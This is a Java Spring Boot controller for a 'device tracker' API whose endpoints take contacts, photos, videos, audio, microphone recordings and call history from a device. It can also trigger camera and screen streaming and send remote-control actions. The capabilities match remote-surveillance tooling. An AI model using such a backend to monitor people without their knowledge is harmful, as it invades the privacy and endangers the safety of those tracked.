package com.manish.device_tracker_api.controller;

import java.io.IOException;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import com.manish.device_tracker_api.config.WebRTCConfig;
import com.manish.device_tracker_api.dto.ApiResponse;
import com.manish.device_tracker_api.dto.AudioFolderResponse;
import com.manish.device_tracker_api.dto.AudioFolderSyncRequest;
import com.manish.device_tracker_api.dto.AudioRefreshRequest;
import com.manish.device_tracker_api.dto.AudioResponse;
import com.manish.device_tracker_api.dto.CallHistoryDTO;
import com.manish.device_tracker_api.dto.CallHistoryRequest;
import com.manish.device_tracker_api.dto.CameraRequest;
import com.manish.device_tracker_api.dto.ContactPayload;
import com.manish.device_tracker_api.dto.ContactResponse;
import com.manish.device_tracker_api.dto.ImageFolderSyncRequest;
import com.manish.device_tracker_api.dto.ImageRefreshRequest;
import com.manish.device_tracker_api.dto.ImageResponse;
import com.manish.device_tracker_api.dto.MicRecordingRequest;
import com.manish.device_tracker_api.dto.MicRecordingResponse;
import com.manish.device_tracker_api.dto.ScreenRequest;
import com.manish.device_tracker_api.dto.SignalMessage;
import com.manish.device_tracker_api.dto.VideoFolderSyncRequest;
import com.manish.device_tracker_api.dto.VideoRefreshRequest;
import com.manish.device_tracker_api.dto.VideoResponse;
import com.manish.device_tracker_api.entity.RemoteAction;
import com.manish.device_tracker_api.service.MediaService;
import com.manish.device_tracker_api.websocket.SessionManager;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.RequiredArgsConstructor;

@RestController
@RequestMapping("/media")
@RequiredArgsConstructor
public class MediaController {

        private final MediaService mediaService;

        private final WebRTCConfig webRTCConfig;

        @Autowired
        private SessionManager sessionManager;

        @Autowired
        private ObjectMapper objectMapper;

        // ======================= Contact =======================

        @PostMapping("/contact/save")
        public ApiResponse<String> saveContact(
                        @RequestBody ContactPayload request) {

                mediaService.saveContact(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Contact Saved")
                                .data(null)
                                .build();
        }

        @GetMapping("/contact/{deviceId}")
        public ApiResponse<List<ContactResponse>> getContacts(
                        @PathVariable String deviceId) {

                return ApiResponse.<List<ContactResponse>>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getContacts(deviceId))
                                .build();
        }

        @PutMapping("/contacts/refresh/{deviceId}")
        public ApiResponse<String> refreshContacts(
                        @PathVariable String deviceId) {

                mediaService.refreshContacts(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Refresh Requested")
                                .data(null)
                                .build();
        }

        @DeleteMapping("/contact/{deviceId}")
        public ApiResponse<String> deleteContacts(
                        @PathVariable String deviceId) {

                mediaService.deleteContacts(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Contacts Deleted")
                                .data(null)
                                .build();
        }

        // ======================= Image =======================

        @PostMapping("/image/upload")
        public ApiResponse<String> uploadImages(

                        @RequestParam("deviceId") String deviceId,

                        @RequestParam("files") List<MultipartFile> files)

                        throws IOException {

                mediaService.saveImages(deviceId, files);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Images Uploaded")
                                .build();
        }

        @GetMapping("/image/{deviceId}")
        public ApiResponse<List<ImageResponse>> getImages(
                        @PathVariable String deviceId) {

                return ApiResponse.<List<ImageResponse>>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getImages(deviceId))
                                .build();
        }

        @DeleteMapping("/image/{deviceId}")
        public ApiResponse<String> deleteImages(
                        @PathVariable String deviceId) {

                mediaService.deleteImages(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Images Deleted")
                                .data(null)
                                .build();
        }

        @PostMapping("/image/folders")
        public ApiResponse<String> syncFolders(
                        @RequestBody ImageFolderSyncRequest request) {

                mediaService.syncFolders(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Folder Synced")
                                .data(null)
                                .build();
        }

        @GetMapping("/image/folders/{deviceId}")
        public ApiResponse<?> getFolders(
                        @PathVariable String deviceId) {

                return ApiResponse.builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getFolders(deviceId))
                                .build();
        }

        @PostMapping("/image/refresh")
        public ApiResponse<String> refreshImages(
                        @RequestBody ImageRefreshRequest request) {

                mediaService.refreshImages(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Refresh Requested")
                                .data(null)
                                .build();
        }

        // ======================= Video =======================

        @PostMapping("/video/upload")
        public ApiResponse<String> uploadVideos(

                        @RequestParam("deviceId") String deviceId,

                        @RequestParam("files") List<MultipartFile> files)

                        throws IOException {

                mediaService.saveVideos(deviceId, files);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Videos Uploaded")
                                .build();
        }

        @GetMapping("/video/{deviceId}")
        public ApiResponse<List<VideoResponse>> getVideos(
                        @PathVariable String deviceId) {

                return ApiResponse.<List<VideoResponse>>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getVideos(deviceId))
                                .build();
        }

        @DeleteMapping("/video/{deviceId}")
        public ApiResponse<String> deleteVideos(
                        @PathVariable String deviceId) {

                mediaService.deleteVideos(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Videos Deleted")
                                .build();
        }

        @PostMapping("/video/folders")
        public ApiResponse<String> syncVideoFolders(
                        @RequestBody VideoFolderSyncRequest request) {

                mediaService.syncVideoFolders(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Video Folders Synced")
                                .build();
        }

        @GetMapping("/video/folders/{deviceId}")
        public ApiResponse<?> getVideoFolders(
                        @PathVariable String deviceId) {

                return ApiResponse.builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getVideoFolders(deviceId))
                                .build();
        }

        @PostMapping("/video/refresh")
        public ApiResponse<String> refreshVideos(
                        @RequestBody VideoRefreshRequest request) {

                mediaService.refreshVideos(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Refresh Requested")
                                .build();
        }

        // ======================= Audio =======================

        @PostMapping("/audio/upload")
        public ApiResponse<String> uploadAudios(

                        @RequestParam("deviceId") String deviceId,

                        @RequestParam("files") List<MultipartFile> files)

                        throws IOException {

                mediaService.saveAudios(deviceId, files);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Audios Uploaded")
                                .build();
        }

        @GetMapping("/audio/{deviceId}")
        public ApiResponse<List<AudioResponse>> getAudios(
                        @PathVariable String deviceId) {

                return ApiResponse.<List<AudioResponse>>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getAudios(deviceId))
                                .build();
        }

        @DeleteMapping("/audio/{deviceId}")
        public ApiResponse<String> deleteAudios(
                        @PathVariable String deviceId) {

                mediaService.deleteAudios(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Audios Deleted")
                                .build();
        }

        @PostMapping("/audio/folders")
        public ApiResponse<String> syncAudioFolders(
                        @RequestBody AudioFolderSyncRequest request) {

                mediaService.syncAudioFolders(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Folders Synced")
                                .build();
        }

        @GetMapping("/audio/folders/{deviceId}")
        public ApiResponse<List<AudioFolderResponse>> getAudioFolders(
                        @PathVariable String deviceId) {

                return ApiResponse.<List<AudioFolderResponse>>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getAudioFolders(deviceId))
                                .build();
        }

        @PostMapping("/audio/refresh")
        public ApiResponse<String> refreshAudios(
                        @RequestBody AudioRefreshRequest request) {

                mediaService.refreshAudios(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Refresh Requested")
                                .build();
        }

        // ======================= Mic Recording =======================

        @PostMapping("/mic/upload")
        public ApiResponse<String> uploadMicRecording(

                        @RequestParam("deviceId") String deviceId,

                        @RequestParam("duration") Integer duration,

                        @RequestParam("file") MultipartFile file)

                        throws IOException {

                mediaService.saveMicRecording(deviceId, duration, file);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Mic Recording Uploaded")
                                .build();
        }

        @PostMapping("/mic/refresh")
        public ApiResponse<String> refreshMic(
                        @RequestBody MicRecordingRequest request) {

                mediaService.refreshMic(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Mic Recording Requested")
                                .build();
        }

        @GetMapping("/mic/{deviceId}")
        public ApiResponse<List<MicRecordingResponse>> getMicRecordings(
                        @PathVariable String deviceId) {

                return ApiResponse.<List<MicRecordingResponse>>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.getMicRecordings(deviceId))
                                .build();
        }

        @DeleteMapping("/mic/{deviceId}")
        public ApiResponse<String> deleteMicRecordings(
                        @PathVariable String deviceId) {

                mediaService.deleteMicRecordings(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Mic Recordings Deleted")
                                .build();
        }

        // ======================= Camera =======================

        @PostMapping("/camera/request")
        public ApiResponse<String> requestCamera(
                        @RequestBody CameraRequest request) {

                mediaService.requestCamera(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Camera request sent")
                                .build();
        }

        @GetMapping("/camera/status/{deviceId}")
        public ApiResponse<Boolean> cameraStatus(
                        @PathVariable String deviceId) {

                return ApiResponse.<Boolean>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.cameraStatus(deviceId))
                                .build();
        }

        @PostMapping("/camera/started/{deviceId}")
        public ApiResponse<String> cameraStarted(
                        @PathVariable String deviceId) {

                mediaService.cameraStarted(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("OK")
                                .data(null)
                                .build();
        }

        @PostMapping("/camera/stopped/{deviceId}")
        public ApiResponse<String> cameraStopped(
                        @PathVariable String deviceId) {

                mediaService.cameraStopped(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("OK")
                                .data(null)
                                .build();
        }

        @PostMapping("/camera/request-received/{deviceId}")
        public ApiResponse<String> cameraRequestReceived(
                        @PathVariable String deviceId) {

                mediaService.cameraRequestReceived(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Camera Request Received")
                                .data(null)
                                .build();
        }

        // ======================= Screen =======================

        @PostMapping("/screen/request")
        public ApiResponse<String> requestScreen(
                        @RequestBody ScreenRequest request) {

                mediaService.requestScreen(request);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Screen request sent")
                                .build();
        }

        @GetMapping("/screen/status/{deviceId}")
        public ApiResponse<String> screenStatus(
                        @PathVariable String deviceId) {

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Success")
                                .data(mediaService.screenStatus(deviceId))
                                .build();

        }

        @PostMapping("/screen/started/{deviceId}")
        public ApiResponse<String> screenStarted(
                        @PathVariable String deviceId) {

                mediaService.screenStarted(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Screen Streaming Started")
                                .data(null)
                                .build();

        }

        @PostMapping("/screen/stopped/{deviceId}")
        public ApiResponse<String> screenStopped(
                        @PathVariable String deviceId) {

                mediaService.screenStopped(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Screen Streaming Stopped")
                                .data(null)
                                .build();

        }

        @PostMapping("/screen/request-received/{deviceId}")
        public ApiResponse<String> screenRequestReceived(
                        @PathVariable String deviceId) {

                mediaService.screenRequestReceived(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Screen Request Received")
                                .data(null)
                                .build();

        }

        @GetMapping("/webrtc/ice")
        public ApiResponse<?> getIceServers() {

                return ApiResponse.builder()

                                .success(true)

                                .message("ICE Servers")

                                .data(
                                                webRTCConfig.getIceServers())

                                .build();

        }

        @PostMapping("/screen/cancel/{deviceId}")
        public ApiResponse<String> cancelScreen(
                        @PathVariable String deviceId) {

                mediaService.screenRequestCancel(deviceId);

                return ApiResponse.<String>builder()
                                .success(true)
                                .message("Cancelled")
                                .build();
        }

        @PostMapping("/remote-action")
        public ResponseEntity<?> remoteAction(
                        @RequestBody RemoteAction action) {

                try {

                        SignalMessage msg = new SignalMessage();

                        msg.setType("remote_action");
                        msg.setAction(action);

                        sessionManager.sendMessage(
                                        action.getDeviceId(),
                                        "device",
                                        "screen",
                                        objectMapper.writeValueAsString(msg));

                        return ResponseEntity.ok("Action Sent");

                } catch (Exception e) {

                        e.printStackTrace();

                        return ResponseEntity.internalServerError()
                                        .body("Failed to send action");

                }

        }

        // Call History
        @PostMapping("/call-history")
        public ResponseEntity<ApiResponse<List<CallHistoryDTO>>> getCallHistory(
                        @RequestBody CallHistoryRequest request) {

                List<CallHistoryDTO> data = mediaService.getCallHistory(request);

                ApiResponse<List<CallHistoryDTO>> response = ApiResponse.<List<CallHistoryDTO>>builder()
                                .success(true)
                                .message("Call history fetched successfully")
                                .data(data)
                                .build();

                return ResponseEntity.ok(response);
        }

        @PostMapping("/call-history/request")
        public ResponseEntity<ApiResponse<String>> requestCallHistory(
                        @RequestBody CallHistoryRequest request) {

                mediaService.requestCallHistory(request);

                return ResponseEntity.ok(
                                ApiResponse.<String>builder()
                                                .success(true)
                                                .message("Call history request sent")
                                                .build());
        }

}